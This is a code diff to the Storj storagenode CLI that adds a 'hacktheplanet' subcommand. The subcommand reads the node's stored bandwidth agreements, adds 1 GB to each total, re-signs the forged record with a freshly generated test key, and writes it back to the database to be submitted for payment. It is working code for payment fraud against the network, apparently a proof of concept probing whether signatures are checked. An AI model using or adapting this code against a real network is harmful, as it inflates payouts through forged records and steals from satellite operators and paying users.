@@ -25,6 +25,11 @@ import (
 	"storj.io/storj/pkg/process"
 	"storj.io/storj/pkg/provider"
 	"storj.io/storj/pkg/storj"
+
+	"github.com/gtank/cryptopasta"
+	"crypto/x509"
+	"crypto/ecdsa"
+	testidentity "storj.io/storj/internal/identity"
 )
 
 var (
@@ -47,6 +52,11 @@ var (
 		Use:   "diag",
 		Short: "Diagnostic Tool support",
 		RunE:  cmdDiag,
+	}
+	hackCmd = &cobra.Command{
+		Use:   "hacktheplanet",
+		Short: "Manipulate the storagenode. Hack the planet.",
+		RunE:  cmdHack,
 	}
 
 	runCfg struct {
@@ -86,9 +96,11 @@ func init() {
 	rootCmd.AddCommand(runCmd)
 	rootCmd.AddCommand(setupCmd)
 	rootCmd.AddCommand(diagCmd)
+	rootCmd.AddCommand(hackCmd)
 	cfgstruct.Bind(runCmd.Flags(), &runCfg, cfgstruct.ConfDir(defaultConfDir))
 	cfgstruct.Bind(setupCmd.Flags(), &setupCfg, cfgstruct.ConfDir(defaultConfDir))
 	cfgstruct.Bind(diagCmd.Flags(), &diagCfg, cfgstruct.ConfDir(defaultDiagDir))
+	cfgstruct.Bind(hackCmd.Flags(), &diagCfg, cfgstruct.ConfDir(defaultDiagDir))
 }
 
 func cmdRun(cmd *cobra.Command, args []string) (err error) {
@@ -149,6 +161,81 @@ func cmdSetup(cmd *cobra.Command, args []string) (err error) {
 	}
 
 	return process.SaveConfig(runCmd.Flags(), filepath.Join(setupDir, "config.yaml"), overrides)
+}
+
+func cmdHack(cmd *cobra.Command, args []string) (err error) {
+	diagDir, err := filepath.Abs(*confDir)
+	if err != nil {
+		return err
+	}
+
+	// check if the directory exists
+	_, err = os.Stat(diagDir)
+	if err != nil {
+		fmt.Println("Storagenode directory doesn't exist", diagDir)
+		return err
+	}
+
+	// open the sql db
+	dbpath := filepath.Join(diagDir, "storage", "piecestore.db")
+	db, err := psdb.Open(context.Background(), "", dbpath)
+	if err != nil {
+		fmt.Println("Storagenode database couldnt open:", dbpath)
+		return err
+	}
+
+	//get all bandwidth aggrements entries already ordered
+	bwAgreements, err := db.GetBandwidthAllocations()
+	if err != nil {
+		fmt.Println("stroage node 'bandwidth_agreements' table read error:", dbpath)
+		return err
+	}
+
+	for _, rbaVal := range bwAgreements {
+		for _, rbaDataVal := range rbaVal {
+			// deserializing rbad you get payerbwallocation, total & storage node id
+			rbad := &pb.RenterBandwidthAllocation_Data{}
+			if err := proto.Unmarshal(rbaDataVal.Agreement, rbad); err != nil {
+				return err
+			}
+
+			// generate a keypair to sign a manipulated paycheck
+			fiS, err := testidentity.NewTestIdentity()
+			if err != nil {
+				return err
+			}
+			privatekey := fiS.Key.(*ecdsa.PrivateKey)
+
+			pubkey, err := x509.MarshalPKIXPublicKey(fiS.Leaf.PublicKey.(*ecdsa.PublicKey))
+			if err != nil {
+				return err
+			}
+
+			// Add 1GB to the total size
+			uplinkdata, _ := proto.Marshal(
+				&pb.RenterBandwidthAllocation_Data{
+					PayerAllocation: rbad.GetPayerAllocation(),
+					PubKey:          pubkey,
+					StorageNodeId:   rbad.StorageNodeId,
+					Total:           rbad.Total + 1000000000,
+				},
+			)
+
+			// sign it
+			uplinksignature, err := cryptopasta.Sign(uplinkdata, privatekey)
+			if err != nil {
+				return err
+			}
+
+			// store it in the database and send it next time together with all the other paychecks
+			err = db.WriteBandwidthAllocToDB(&pb.RenterBandwidthAllocation{
+				Signature: uplinksignature,
+				Data:      uplinkdata,
+			})
+		}
+	}
+	
+	return nil
 }
 
 func cmdDiag(cmd *cobra.Command, args []string) (err error) {
@@ -263,3 +350,4 @@ func isFarmerWalletValid(wallet string) error {
 func main() {
 	process.Exec(rootCmd)
 }
+
